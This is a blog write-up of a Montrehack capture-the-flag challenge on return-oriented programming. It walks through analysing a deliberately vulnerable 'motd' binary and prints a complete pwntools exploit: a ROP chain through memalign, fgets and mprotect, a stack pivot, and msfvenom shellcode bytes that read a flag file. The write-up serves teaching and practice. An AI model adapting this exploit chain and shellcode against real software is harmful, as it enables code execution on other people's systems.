---
title: 'Montrehack Writeups: motd_v0.3'
date: '2019-05-25 09:38:15'
tags:
    - CTF
    - Montrehack
    - Exploitation
description: |
    At long last, the final post in my series of write-ups for the Montrehack
    workshop on Return Oriented Programming. I held out on this writeup for a little
    bit, both because I didn't actually have time to write, but also because I was
    hoping to give people more time to try it. This challenge was orders of
    magnitude harder than its predecessors and was mostly intended as a wall for
    people who got through the first two challenges too quickly. Thankfully nobody
    made it to this challenge during the workshop, which means the level of
    difficulty was good enough.
---

*This post describes the intended solution for the Montrehack challenge
`motd_v0.3`. For the previous challenges, see [motd_v0.1][1] and [motd_v0.2][2].
The challenge sources and solutions can be [found here][src].*

[1]: https://segfault.me/2019/03/03/montrehack-writeups-motd-v0-1/ "Write-up for motd_v0.1"
[2]: https://segfault.me/2019/04/20/montrehack-writeups-motd-v0-2/ "Write-up for motd_v0.2"
[m]: https://montrehack.ca "Montrehack Official Website"
[src]: https://github.com/alxbl/montrehack-rop101 "ROP 101: Sources & Solutions"

## Introduction

At long last, the final post in my series of write-ups for the Montrehack
workshop on Return Oriented Programming. I held out on this writeup for a little
bit, both because I didn't actually have time to write, but also because I was
hoping to give people more time to try it. This challenge was orders of
magnitude harder than its predecessors and was mostly intended as a wall for
people who got through the first two challenges too quickly. Thankfully nobody
made it to this challenge during the workshop, which means the level of
difficulty was good enough.


## Phase 1 - Reconaissance

As usual, the first step is to check the executable properties:

```bash
$ file motd_v0.4

motd_v0.3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
BuildID[sha1]=3299d453b24989760f9afb0f3d489b683df0efb8, not stripped

$ checksec -f motd_v0.3
RELRO         STACK CANARY    NX         PIE    RPATH    RUNPATH    Symbols
Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 89 Symbols
```

This is identical to motd_v0.2:
* Dynamic linking,
* No ASLR
* NX enabled

So we'll most likely need to do a ret2libc with system... let's get the address
right away:

```
$ readelf -s motd_v0.3 | grep GLIBC
    ... snip ...
    18: 0000000000404090     8 OBJECT  GLOBAL DEFAULT   24 stdout@GLIBC_2.2.5 (2)
    19: 00000000004040a0     8 OBJECT  GLOBAL DEFAULT   24 stdin@GLIBC_2.2.5 (2)
    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND putchar@@GLIBC_2.2.5
    50: 0000000000404090     8 OBJECT  GLOBAL DEFAULT   24 stdout@@GLIBC_2.2.5
    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    53: 00000000004040a0     8 OBJECT  GLOBAL DEFAULT   24 stdin@@GLIBC_2.2.5
    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@@GLIBC_2.2.5
    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    62: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.2.5
    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getchar@@GLIBC_2.2.5
    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memalign@@GLIBC_2.2.5
    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@@GLIBC_2.2.5
    72: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@@GLIBC_2.2.5
    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.2.5
    80: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND mprotect@@GLIBC_2.2.5
    83: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __isoc99_scanf@@GLIBC_2.7
    84: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5
```

Wait... `system` is not in the PLT? Opening the binary in radare to confirm it
is fairly obvious that this is the exact same code as challenge 2, but with the
call to `system()` entirely stripped. Combing through the imported symbols,
there are no gadgets that would let us evaluate a command directly.

What this means is that we will need a way to execute raw assembly code.


## Phase 2 - Planning the Attack

The vulnerability is the same as `motd_v0.2`, recall that the available actions
for the user are:

* Read user-controlled data and display it to the screen (Option 1)
* Write data to a buffer somewhere (Option 2)

However, this time we cannot simply put a command in a buffer. We first need to
allocate an executable buffer somewhere in memory to store our shellcode. Once
we have the buffer's address, we need to somehow upload or write our shellcode
into that buffer. Lastly, we need to transfer execution to our shellcode. All of
that with the stack being marked as No-eXecute. More concretely, we need to:


1. Take control of the execution pointer and launch a ROP chain
2. Allocate a buffer (`malloc`\*)
3. Make the buffer executable (`mprotect`)
4. Generate a shellcode that will read the flag (`msfvenom`)
5. Retrieve `stdin` from the GOT to use in the next step
6. Upload the shellcode into the buffer (`fgets`)
7. Jump into the buffer (`jmp $reg` gadget)

Whew, that's a long chain!

> **NOTE**: `malloc` sounds fine until you try to run the exploit and realize that
> `mprotect` is failing. The reason for this is that `malloc` will prefix some
> metadata in the buffer, making the actual user-controlled portion of it not be
> page aligned. However, `mprotect` expects a [page-aligned address][man]. The
> solution is to use `memalign` instead.

Thankfully, all the necessary functions seem to be imported in the PLT. How convenient!

[man]: http://man7.org/linux/man-pages/man2/mprotect.2.html "Manual Pages for mprotect"

## Phase 3 - Building the Gadget Chain

Let's break down the gadgets per function call and explain what they are used
for. Recall the Linux x64 calling convention: `rdi, rsi, rdx, rcx, r8, r9`.

We will need, at the very least, gadgets for `rdi`, `rsi`, and `rdx`. We will
also need some additional gadgets to jump into the buffer, swap some registers
around, and retrieve `stdin`. There is more than one possible solution here, but
I have settled for the following gadgets after some trial and error. Your
solution might vary.


```python
# $ ROPGadget.py --binary motd_v0.3 | less
RSP = 0x000000000040181d #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
RBP = 0x00000000004011cd #: pop rbp ; ret
RDI = 0x0000000000401823 #: pop rdi ; ret
RSI = 0x0000000000401821 #: pop rsi ; pop r15 ; ret
RAX = 0x00000000004011ee #: xchg rax, rdi ; ret
RDX = 0x00000000004011f1 #: mov rdx, rsi ; ret
JMP = 0x000000000040115e #: jmp rax # to jump into shellcode
FD  = 0x00000000004011f5 #: mov rdx, qword ptr [rbp - 4] ; ret # To get *stdin@GOT
PAD = 0x4141414141414141 #: padding # to feed hungry pops
```

Getting `stdin` required a way to dereference a register. When looking for
gadgets, it's a good idea to pick the ones with the least possible side effects
and in this case it turned out to be an `[rbp - 4]`, so this required an
additional `pop rbp` gadget. This is fine in this case because it's okay to
crash the process, but would make recovery in a real exploit a lot more
difficult.  The `RSP` gadget will make sense in a few paragraphs.

Next, we need the address of the PLT entries in order to build the ROP chain.
This can be done manually in any reversing tool or with readelf, but here is a
nice `r2` one-liner for brevity:

```python
# r2 -qc 'pd @ section..plt' motd_v0.3 | grep -E 'reloc.(memalign|mprotect|fgets)'
FGETS    = 0x00401070 # sym.imp.fgets
MEMALIGN = 0x00401090 # sym.imp.memalign
MPROTECT = 0x004010d0 # sym.imp.mprotect
STDIN    = 0x004040a0 # obj.stdin__GLIBC_2.2.5
```

Alright, we have everything we need. Let's build the ROP chain.

----

```python
CALL_MEMALIGN = [
    RSI,      # pop rsi ; pop r15 ; ret
    0x100,    # rsi=0x100
    PAD,      # r15=PAD
    RDI,      # pop rdi ; ret
    0x1000,   # rdi=0x1000
    MEMALIGN, # memalign(align=rdi, size=rsi)
    RAX,      # xchg rax, rdi ; ret
]
```

Recall also that the result of function calls goes into `rax`, so we'll need a
way to move `rax` into `rdi` to retrieve the allocated buffer address, hence the
`RAX` gadget. Everything else is just shuffling the registers to get the
arguments from the stack into the right place.


----

```python
GET_STDIN = [
    RBP,       # pop rbp ; ret
    STDIN + 4, # rbp=STDIN+4
    FD,        # mov rdx, qword ptr [rbp - 4] ; ret
]
```

The most interesting part of this chain is the addition to the `stdin` address
in order to counteract the `FD` gadget. After this part of the chain, `rdx`
contains the file descriptor for `stdin`

----

```python
CALL_FGETS = [
    RSI,   # pop rsi ; pop r15 ; ret
    0x100, # rsi=0x100
    PAD,   # r15=PAD
    FGETS, # fgets(buf=rdi, size=rsi, fd=rdx)
]
```

Thanks to the previous gadgets in the chain, `rdi` already contains the buffer
address and `rdx` already contains the `stdin` file descriptor.

----


```python
CALL_MPROTECT = [
    RAX,      # xchg rax, rdi ; ret
    RSI,      # pop rsi ; pop r15 ; ret
    0x7,      # rsi=PROT_READ | PROT_EXEC | WRITE
    PAD,      # r15=PAD
    RDX,      # mov rdx, rsi ; ret
    RSI,      # pop rsi ; pop r15; ret
    0x100,    # rsi=0x100
    PAD,      # r15=PAD
    MPROTECT, # mprotect(buf=rdi, size=rsi, flags=rdx)
]
```

While debugging, it looks like `fgets` is clobbering `rdi`, but thankfully it
returns the buffer into `rax` so it's possible to just move it to `rdi` again
before the `mprotect` call. The other important thing to notice is that there is
no gadget to pop into `rdx` directly, so instead a `mov` is used, hence `rsi`
being set twice.

----

```python
CALL_SHELLCODE = [
    RAX, # xchg rax, rdi ; ret
    JMP,
]
```

All that's left is to move the address of the buffer from `rax` into `rdi`, one
last time and use the `jmp rax` gadget to finally transfer execution to the
shellcode buffer.

## Phase 4 - Pivoting to Freedom (and Flags)

If you've read through the write-up for the second challenge, you might remember
that we only controlled one out of every two QWORDs through the rating function.
Our gadget chain is much longer than that though... so we need a way to fit it
somehwere in memory and pivot to it. Luckily, it is possible to write the chain
into a motd buffer and then write a pivot into the return address.

The pivot gadget that I selected also pops `r13-r15`, so this requires a bit of
padding in the chain. The final exploit code looks like this:

```python
#!/usr/bin/env python
from pwn import *
from struct import pack
def q(addr): return pack('<Q', addr)

TARGET = '../bin/motd_v0.3' # Binary path (local)

# msfvenom -p linux/x64/exec CMD='cat ~/flag.txt' -f c -b "\x0a\x0d"
SHELLCODE = (
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0f\x00"
"\x00\x00\x63\x61\x74\x20\x7e\x2f\x66\x6c\x61\x67\x2e\x74\x78"
"\x74\x00\x56\x57\x48\x89\xe6\x0f\x05"
)

# ROPGadget.py --binary motd_v0.3 | less
RSP = 0x000000000040181d #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
RBP = 0x00000000004011cd #: pop rbp ; ret
RDI = 0x0000000000401823 #: pop rdi ; ret
RSI = 0x0000000000401821 #: pop rsi ; pop r15 ; ret
RAX = 0x00000000004011ee #: xchg rax, rdi ; ret
FD  = 0x00000000004011f5 #: mov rdx, qword ptr [rbp - 4] ; ret # To get *stdin@GOT
RDX = 0x00000000004011f1 #: mov rdx, rsi ; ret
JMP = 0x000000000040115e #: jmp rax # to jump into shellcode
PAD = 0x4141414141414141 #: padding # to feed hungry pops

# Taken from the PLT since it's static with partial relro.
# r2 -qc 'pd @ section..plt' bin/motd_v0.3 | grep -E 'reloc.(memalign|mprotect|fgets)'
FGETS    = 0x00401070 # sym.imp.fgets
MEMALIGN = 0x00401090 # sym.imp.memalign
MPROTECT = 0x004010d0 # sym.imp.mprotect
STDIN    = 0x004040a0 # obj.stdin__GLIBC_2.2.5
BUFLEN   = 0x100
ALIGN    = 0x1000

ROP = [
        # PIVOT RSP
        PAD, PAD, PAD, # pop {r13, r14, r15}:

        # memalign(rdi=align, rsi=size) call
        RSI, # rsi=BUFLEN
        BUFLEN,
        PAD, # pop r15
        RDI, # rdi=ALIGN
        ALIGN,
        MEMALIGN,
        RAX, #  SWAP RDI and RAX

        # fgets(rdi=buf, rsi=BUFLEN, rdx=stdin) call
        RBP, # rdx=stdin (dereference gadget is [rbp - 4] so add 4)
        STDIN + 4,
        FD,

        RSI, # rsi=BUFLEN
        BUFLEN,
        PAD, # pop r15
        FGETS, # ret to fgets

        # mprotect(rdi=buf, rsi=0x7, rdx=5)
        RAX,
        RSI, # rdx=0
        0x7, # PROT_READ | PROT_EXEC | WRITE
        PAD, # pop r15
        RDX,
        RSI,
        BUFLEN,
        PAD, # pop r15
        MPROTECT, # ret to mprotect

        # Jump to shellcode
        RAX, # xchg rax, rdi (shellcode address is in rdi)
        JMP  # jmp rax
]

PAYLOAD = ''.join([ q(gadget) for gadget in ROP ])

p = process(TARGET)

p.sendline("2") # Option 2: Set motd
p.sendline("1") # First motd
p.sendline(PAYLOAD) # Set the motd buffer to ROP chain


p.sendline("3") # Option 3: Rate motd
p.sendline("0") # Out-of-Bound Write on top of return address

p.sendline(str(RSP)) # Set return address to pivot gadget.
p.sendline(SHELLCODE) # Send shellcode for fgets
print p.readall()
```

```bash
$ ./3.py
=== ROP/03: Solution ===

[+] Starting local process '../bin/motd_v0.3': pid 16457
[+] Receiving all data: Done (577B)
[*] Process '../bin/motd_v0.3' stopped with exit code 0 (pid 16457)
motd daemon v0.3 (c) 2019 BetterSoft
    Now with 100% less system!

=> How may I help you today?
    1 - View message of the day
    2 - Change message of the day
    3 - Rate message of the day
    4 - Exit
>
=> Which message of the day? (1-3)
> => Type in the new message of the day please:
>
=> How may I help you today?
    1 - View message of the day
    2 - Change message of the day
    3 - Rate message of the day
    4 - Exit
>
=> Which message of the day? (1-3)
> => @ Rating? (out of 10)
> Thank you! Your opinion matters to us.
FLAG-{D_d_D_dR0P_+h3_rOP_GuRu}
```

## Conclusion

This challenge was a lot more difficult that the other two challenges. It
demonstrated a complex, multi-stage ROP chain with a stack pivot to execute an
arbitrary shellcode. The goal was to give something challenging to participants
experienced in return oriented programming and highlight how complex real world
exploits can get.

-----

### Resources

* [Montrehack Workshop: Slides and Presentation (Video)][presentation]
* [Montrehack Workshop: Solutions for challenge 1 & 2 (Video)][solutions]
* [Slides on Github][slides]

[presentation]: https://www.twitch.tv/videos/384854978 "Presentation of Slides"
[solutions]: https://www.twitch.tv/videos/384854977 "Presentation of Solutions"
[slides]: https://github.com/alxbl/montrehack-rop101/blob/master/slides_final.pdf "Slides PDF"

